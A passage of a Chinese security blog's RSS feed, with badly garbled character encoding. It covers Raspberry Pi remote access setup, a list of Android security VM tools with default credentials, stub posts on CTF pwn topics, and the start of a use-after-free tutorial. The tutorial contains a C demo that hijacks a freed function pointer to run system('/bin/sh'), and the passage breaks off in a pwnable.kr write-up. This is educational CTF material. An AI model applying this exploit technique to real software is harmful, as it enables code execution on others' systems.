&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623004049.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>å…è®¸rootç™»é™†ï¼Œä¿®æ”¹&lt;code>/etc/ssh/sshd.conf&lt;/code> ä¸‹çš„&lt;code>PermitRootLogin yes&lt;/code> &lt;code>StrictModes yes&lt;/code> å°±okã€‚&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623004313.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ul>
&lt;li>VNC&lt;/li>
&lt;/ul>
&lt;p>win10ä¸‹è½½&lt;a class="link" href="https://www.realvnc.com/" target="_blank" rel="noopener"
>vncå®¢æˆ·ç«¯&lt;/a>&lt;/p>
&lt;p>RaspberryPI å‘½ä»¤å¼€å¯server:&lt;code>vncserver&lt;/code>&lt;/p>
&lt;p>è¿æ¥æˆåŠŸï¼š&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623004603.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>è¿æ¥å‡ºç°åˆ†è¾¨ç‡é—®é¢˜&lt;/p>
&lt;p>è®¾ç½®åˆ†è¾¨ç‡ï¼šå‘½ä»¤&lt;code>sudo raspi-config&lt;/code>-&amp;gt;Advanced Opt -&amp;gt;Resolutioné€‰æ‹©åˆ†è¾¨ç‡ã€‚é‡å¯å°±å®Œäº‹ã€‚&lt;/p>
&lt;h3 id="0x04-ç¡¬ä»¶æ£€æŸ¥">0x04 ç¡¬ä»¶æ£€æŸ¥&lt;/h3>
&lt;ol>
&lt;li>ç³»ç»Ÿé•œåƒç‰ˆæœ¬å·&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623005614.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ol>
&lt;li>æ¿å­å‹å·ï¼š&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623005511.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ol>
&lt;li>&lt;strong>ç³»ç»Ÿå›ºä»¶ç‰ˆæœ¬å·&lt;/strong>&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623005714.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>çœ‹çœ‹ç¡¬ä»¶ï¼š&lt;/p>
&lt;ol>
&lt;li>usb&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623010117.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ol>
&lt;li>cpu&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623010156.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>è¯´å¥½çš„v8?&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623010258.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ol>
&lt;li>ç½‘å¡&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623010503.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190623010528.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="0x05-æ€»ç»“">0x05 æ€»ç»“&lt;/h3>
&lt;p>é—²äº†å¾ˆä¹…ï¼Œç°åœ¨ç»ˆäºåŠ¨æ‰‹æè‡ªå·±æƒ³æçš„ä¸œè¥¿ï¼ŒèŠ±äº†ä¸€ä¸ªæ™šä¸Šï¼Œæå®Œè¿™äº›ç®€å•çš„å®‰è£…é…ç½®ï¼ŒæŒºè´¹æ—¶è´¹åŠ›çš„ï¼Œä¸è¿‡è‡ªå·±å¼€å¿ƒå°±å¥½ã€‚æœ€å¥½æ˜¯è‡ªå·±èƒ½å¤ŸåšæŒä¸‹å»ï¼Œåšæ›´å¤šæœ‰è¶£çš„äº‹ã€‚&lt;/p>
&lt;p>&lt;img src="https://as2.bitinn.net/uploads/5d/cjvmpwzcf000bx38hgr1oua5d.1080p.jpg"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>12&lt;/p></description></item><item><title>MobSecVM</title><link>https://ykiko.top/p/mobsecvm/</link><pubDate>Sun, 16 Jun 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/mobsecvm/</guid><description>&lt;h1 id="mobsecvm">MobSecVM&lt;/h1>
&lt;h3 id="0x00-å‰è¨€">0x00 å‰è¨€&lt;/h3>
&lt;p>æœ€è¿‘ä¸çŸ¥ä¸ºä½•VM-Ubuntuç‚¸äº†ï¼Œè¯•äº†å„ç§æ–¹æ³•ï¼ŒæŠ˜è…¾äº†å¾ˆä¹…ä¹‹åï¼Œç»ˆäºæ¢å¤äº†ã€‚åˆæµªè´¹æ—¶é—´å’Œç¯å¢ƒæ–—å¿—æ–—å‹‡ã€‚è‡ªæ­¤æ‰“ç®—è‡ªå·±å¼„ä¸€ä¸ªåŒ…å«äº†Androidå®‰å…¨æ‰€éœ€å„ç§å·¥å…·çš„ç¯å¢ƒï¼Œåšä¸ªå¤‡ä»½ã€‚é˜²æ­¢å“ªå¤©åˆå‡ºå„ç§å„æ ·çš„é—®é¢˜ã€‚&lt;/p>
&lt;p>é¡¹ç›®åœ°å€ï¼šMobSecVM&lt;/p>
&lt;p>ä¸‹è½½åœ°å€ï¼šbaiduyunã€google_yun&lt;/p>
&lt;h3 id="0x01-ç¯å¢ƒå‡†å¤‡">0x01 ç¯å¢ƒå‡†å¤‡&lt;/h3>
&lt;ul>
&lt;li>Ubuntu 18.04 LTS&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>Usernameï¼šmobsec&lt;/p>
&lt;/blockquote>
&lt;pre>&lt;code>Passwordï¼šmobsec
&lt;/code>&lt;/pre>
&lt;ul>
&lt;li>Vmware 15&lt;/li>
&lt;/ul>
&lt;h3 id="0x02-tools-ä¸æ–­è¡¥å……">0x02 Tools ï¼ˆä¸æ–­è¡¥å……ï¼‰&lt;/h3>
&lt;p>[x] &lt;a class="link" href="http://developer.android.com/tools/studio/index.html" target="_blank" rel="noopener"
>AndroidStudio&lt;/a> å¼€å‘å…¨å®¶æ¡¶å¸¦æ¨¡æ‹Ÿå™¨&lt;/p>
&lt;p>[x] &lt;a class="link" href="https://github.com/radare/radare2" target="_blank" rel="noopener"
>Radare2&lt;/a> é€†å‘æ¡†æ¶&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;a class="link" href="https://www.frida.re/" target="_blank" rel="noopener"
>Frida&lt;/a> Hookå·¥å…·&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://github.com/mwrlabs/drozer" target="_blank" rel="noopener"
>Drozer&lt;/a> Androidåº”ç”¨ç¨‹åºå®‰å…¨è¯„ä¼°æ¡†æ¶&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://github.com/iBotPeaches/Apktool" target="_blank" rel="noopener"
>APKtool&lt;/a> APKé€†å‘å·¥å…·&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://portswigger.net/burp" target="_blank" rel="noopener"
>BurpSuite&lt;/a> æŠ“æ”¹åŒ…ï¼Œå®‰å…¨æ£€æµ‹&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://www.wireshark.org/" target="_blank" rel="noopener"
>Wireshare&lt;/a> æŠ“åŒ…å·¥å…·&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>[x] &lt;a class="link" href="https://github.com/MobSF/Mobile-Security-Framework-MobSF" target="_blank" rel="noopener"
>MobSF&lt;/a> åº”ç”¨ç¨‹åºè‡ªåŠ¨åŒ–åˆ†ææ¡†æ¶&lt;/p>
&lt;p>[] &lt;a class="link" href="https://github.com/androguard/androguard" target="_blank" rel="noopener"
>androguard&lt;/a> ä¸€æ¬¾åŸºäºpythonçš„é€†å‘å·¥ç¨‹ï¼Œæ¶æ„è½¯ä»¶å’Œè½¯ä»¶åˆ†æAndroidåº”ç”¨ç¨‹åºçš„æ¡†æ¶ã€‚&lt;/p>
&lt;p>[x] &lt;a class="link" href="https://code.visualstudio.com/" target="_blank" rel="noopener"
>VScode&lt;/a> ç¼–è¾‘å™¨&lt;/p>
&lt;p>[] &lt;a class="link" href="https://github.com/konloch/bytecode-viewer" target="_blank" rel="noopener"
>bytecode-viewer&lt;/a>&lt;/p>
&lt;p>[] &lt;a class="link" href="https://github.com/programa-stic/barf-project" target="_blank" rel="noopener"
>barfâ€“project&lt;/a>&lt;/p>
&lt;p>[x] &lt;a class="link" href="https://github.com/skylot/jadx" target="_blank" rel="noopener"
>jadx&lt;/a> Dex to Java decompiler&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;a class="link" href="https://github.com/xtiankisutsa/MARA_Framework" target="_blank" rel="noopener"
>MARA_Framework&lt;/a> Mobile Application Reverse engineering and Analysis Framework.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://github.com/AndroBugs/AndroBugs_Framework" target="_blank" rel="noopener"
>AndroBugs Framework&lt;/a> Android vulnerability scanner&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://github.com/linkedin/qark" target="_blank" rel="noopener"
>qark&lt;/a> Tool to look for several security related Android application vulnerabilities&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://github.com/payatu/diva-android" target="_blank" rel="noopener"
>DIVA&lt;/a> Damn Insecure and vulnerable App for Android&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://github.com/dineshshetty/Android-InsecureBankv2" target="_blank" rel="noopener"
>InsecureBankv2&lt;/a> Vulnerable Android application for developers and security enthusiasts to learn about Android insecurities&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://github.com/rafaeltoledo/android-security" target="_blank" rel="noopener"
>Android Security Sandbox&lt;/a> An app showcase of some techniques to improve Android app security&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://github.com/jackMannino/OWASP-GoatDroid-Project" target="_blank" rel="noopener"
>GoatDroid&lt;/a> A fully functional and self-contained training environment for educating developers and testers on Android security&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://github.com/tanprathan/sievePWN" target="_blank" rel="noopener"
>sievePWN&lt;/a> An android application which exploits sieve through android components.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x03-å°æ’ä»¶">0x03 å°æ’ä»¶&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>on_my_zsh&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="http://plugins.jetbrains.com/plugin/3847-findbugs-idea" target="_blank" rel="noopener"
>FindBugs-IDEA&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>docker&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x04-æ•ˆæœå›¾">0x04 æ•ˆæœå›¾&lt;/h3></description></item><item><title>PWN-æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´(FMT)</title><link>https://ykiko.top/p/pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9Efmt/</link><pubDate>Fri, 12 Apr 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9Efmt/</guid><description>&lt;h1 id="pwn-æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´fmt">PWN-æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´(FMT)&lt;/h1>
&lt;h2 id="0x00-ç®€ä»‹">0x00 ç®€ä»‹&lt;/h2></description></item><item><title>FuzzingåŸºç¡€(å¾…è¡¥å……)</title><link>https://ykiko.top/p/fuzzing%E5%9F%BA%E7%A1%80%E5%BE%85%E8%A1%A5%E5%85%85/</link><pubDate>Wed, 10 Apr 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/fuzzing%E5%9F%BA%E7%A1%80%E5%BE%85%E8%A1%A5%E5%85%85/</guid><description>&lt;h1 id="fuzzingåŸºç¡€å¾…è¡¥å……">FuzzingåŸºç¡€(å¾…è¡¥å……)&lt;/h1>
&lt;h2 id="0x00">0x00&lt;/h2></description></item><item><title>CTF-PWNåˆ·é¢˜è®°å½•-CTFWiki_3å †åˆ©ç”¨ï¼ˆå¾…è¡¥å……ï¼‰</title><link>https://ykiko.top/p/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_3%E5%A0%86%E5%88%A9%E7%94%A8%E5%BE%85%E8%A1%A5%E5%85%85/</link><pubDate>Thu, 04 Apr 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_3%E5%A0%86%E5%88%A9%E7%94%A8%E5%BE%85%E8%A1%A5%E5%85%85/</guid><description>&lt;h1 id="ctf-pwnåˆ·é¢˜è®°å½•-ctfwiki_3å †åˆ©ç”¨å¾…è¡¥å……">CTF-PWNåˆ·é¢˜è®°å½•-CTFWiki_3å †åˆ©ç”¨ï¼ˆå¾…è¡¥å……ï¼‰&lt;/h1>
&lt;h2 id="ç®€ä»‹">ç®€ä»‹&lt;/h2></description></item><item><title>PWN-OOB(é‡å†™ä¸­)</title><link>https://ykiko.top/p/pwn-oob%E9%87%8D%E5%86%99%E4%B8%AD/</link><pubDate>Mon, 25 Mar 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/pwn-oob%E9%87%8D%E5%86%99%E4%B8%AD/</guid><description>&lt;h1 id="pwn-oobé‡å†™ä¸­">PWN-OOB(é‡å†™ä¸­)&lt;/h1>
&lt;h2 id="0x00-ç®€ä»‹">0x00 ç®€ä»‹&lt;/h2></description></item><item><title>CTF-PWNåˆ·é¢˜è®°å½•-CTFWiki_2æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆå¾…è¡¥å……ï¼‰</title><link>https://ykiko.top/p/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_2%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%BE%85%E8%A1%A5%E5%85%85/</link><pubDate>Fri, 22 Mar 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_2%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%BE%85%E8%A1%A5%E5%85%85/</guid><description>&lt;h1 id="ctf-pwnåˆ·é¢˜è®°å½•-ctfwiki_2æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å¾…è¡¥å……">CTF-PWNåˆ·é¢˜è®°å½•-CTFWiki_2æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆå¾…è¡¥å……ï¼‰&lt;/h1>
&lt;h2 id="ç®€ä»‹">ç®€ä»‹&lt;/h2></description></item><item><title>PWN-UAF_ï¼ˆé‡å†™ï¼‰</title><link>https://ykiko.top/p/pwn-uaf_%E9%87%8D%E5%86%99/</link><pubDate>Wed, 20 Mar 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/pwn-uaf_%E9%87%8D%E5%86%99/</guid><description>&lt;h1 id="pwn-uaf_é‡å†™">PWN-UAF_ï¼ˆé‡å†™ï¼‰&lt;/h1>
&lt;h2 id="0x00-åŸç†">0x00 åŸç†&lt;/h2>
&lt;p>å †å†…å­˜åœ¨é‡Šæ”¾åè¢«ç›´æ¥å†æ¬¡ä½¿ç”¨(é‡Šæ”¾äº†å †å—ä¹‹åï¼Œæœªå°†è¯¥æŒ‡é’ˆå€¼ä¸ºNULL,å¯¼è‡´æŒ‡é’ˆå¤„äºæ‚¬ç©ºçŠ¶æ€ï¼Œè¢«é‡Šæ”¾çš„å†…å­˜èƒ½è¢«æ¶æ„åˆ©ç”¨) åœ¨æµè§ˆå™¨ä¸­æ¯”è¾ƒå¸¸è§çš„æ¼æ´&lt;/p>
&lt;p>&lt;strong>æ ¹æœ¬åŸå› æ˜¯ï¼š&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>åº”ç”¨ç¨‹åºè°ƒç”¨free()é‡Šæ”¾å†…å­˜æ—¶ï¼Œå¦‚æœå†…å­˜å—å°äº256kbï¼Œdlmallocå¹¶ä¸é©¬ä¸Šå°†å†…å­˜å—é‡Šæ”¾å›å†…å­˜ï¼Œè€Œæ˜¯å°†å†…å­˜å—æ ‡è®°ä¸ºç©ºé—²çŠ¶æ€ã€‚è¿™ä¹ˆåšçš„åŸå› æœ‰ä¸¤ä¸ªï¼šä¸€æ˜¯å†…å­˜å—ä¸ä¸€å®šèƒ½é©¬ä¸Šé‡Šæ”¾ä¼šå†…æ ¸ï¼ˆæ¯”å¦‚å†…å­˜å—ä¸æ˜¯ä½äºå †é¡¶ç«¯ï¼‰ï¼ŒäºŒæ˜¯ä¾›åº”ç”¨ç¨‹åºä¸‹æ¬¡ç”³è¯·å†…å­˜ä½¿ç”¨ï¼ˆè¿™æ˜¯ä¸»è¦åŸå› ï¼‰ã€‚å½“dlmallocä¸­ç©ºé—²å†…å­˜é‡è¾¾åˆ°ä¸€å®šå€¼æ—¶dlmallocæ‰å°†ç©ºé—²å†…å­˜é‡Šæ”¾ä¼šå†…æ ¸ã€‚å¦‚æœåº”ç”¨ç¨‹åºç”³è¯·çš„å†…å­˜å¤§äº256kbï¼Œdlmallocè°ƒç”¨mmap()å‘å†…æ ¸ç”³è¯·ä¸€å—å†…å­˜ï¼Œè¿”å›è¿”è¿˜ç»™åº”ç”¨ç¨‹åºä½¿ç”¨ã€‚å¦‚æœåº”ç”¨ç¨‹åºé‡Šæ”¾çš„å†…å­˜å¤§äº256kbï¼Œdlmallocé©¬ä¸Šè°ƒç”¨munmap()é‡Šæ”¾å†…å­˜ã€‚dlmallocä¸ä¼šç¼“å­˜å¤§äº256kbçš„å†…å­˜å—ï¼Œå› ä¸ºè¿™æ ·çš„å†…å­˜å—å¤ªå¤§äº†ï¼Œæœ€å¥½ä¸è¦é•¿æœŸå ç”¨è¿™ä¹ˆå¤§çš„å†…å­˜èµ„æºã€‚&lt;/p>
&lt;/blockquote>
&lt;h3 id="åˆ©ç”¨">åˆ©ç”¨&lt;/h3>
&lt;h3 id="ç®€å•åˆ©ç”¨">ç®€å•åˆ©ç”¨&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="k">typedef&lt;/span> &lt;span class="nf">void&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">func_ptr&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">evil_fuc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="n">command&lt;/span>&lt;span class="p">[])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">command&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">echo&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="n">content&lt;/span>&lt;span class="p">[])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;%s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">content&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">func_ptr&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">func_ptr&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nf">malloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;malloc addr: %p&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">p1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">p1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">echo&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">p1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">](&lt;/span>&lt;span class="s">&amp;#34;hello world&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">free&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p1&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">//åœ¨è¿™é‡Œfreeäº†p1,ä½†å¹¶æœªå°†p1ç½®ç©º,å¯¼è‡´åç»­å¯ä»¥å†ä½¿ç”¨p1æŒ‡é’ˆ
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">p1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">](&lt;/span>&lt;span class="s">&amp;#34;hello again&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">//p1æŒ‡é’ˆæœªè¢«ç½®ç©º,è™½ç„¶freeäº†,ä½†ä»å¯ä½¿ç”¨.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">func_ptr&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">p2&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">func_ptr&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nf">malloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="c1">//mallocåœ¨freeä¸€å—å†…å­˜å,å†æ¬¡ç”³è¯·åŒæ ·å¤§å°çš„æŒ‡é’ˆä¼šæŠŠåˆšåˆšé‡Šæ”¾çš„å†…å­˜åˆ†é…å‡ºæ¥.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;malloc addr: %p&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">p2&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;malloc addr: %p&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">p1&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="c1">//p2ä¸p1æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä¸ºåŒä¸€åœ°å€
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">p2&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">evil_fuc&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">//åœ¨è¿™é‡Œå°†p1æŒ‡é’ˆé‡Œé¢ä¿å­˜çš„echoå‡½æ•°æŒ‡é’ˆè¦†ç›–æˆä¸ºäº†evil_funcæŒ‡é’ˆ.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">p1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">](&lt;/span>&lt;span class="s">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180912215411.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="pwnablekr-uaf">pwnable.kr uaf&lt;/h3>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180912220453.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>å…ˆçœ‹çœ‹æºç ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
